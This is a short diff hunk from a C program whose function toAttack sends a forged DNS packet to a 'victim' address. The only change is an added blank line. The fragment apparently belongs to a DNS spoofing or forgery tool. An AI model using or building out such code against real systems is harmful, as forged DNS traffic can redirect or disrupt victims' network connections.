@@ -73,6 +73,7 @@ void toAttack()
 	{
 		printf("\n=> Press <enter> to send a forged package to the victim...\n");
 		getchar();
+		
 		if (sendto(sck, (char*) buffer, sizeof(struct DNS_H) + (strlen(host)+1) + sizeof(struct QUESTION), 0, (struct sockaddr*)&victim, sizeAddr) < 0)
 	        printf("\nSendto local host failed!\n");
 		else 
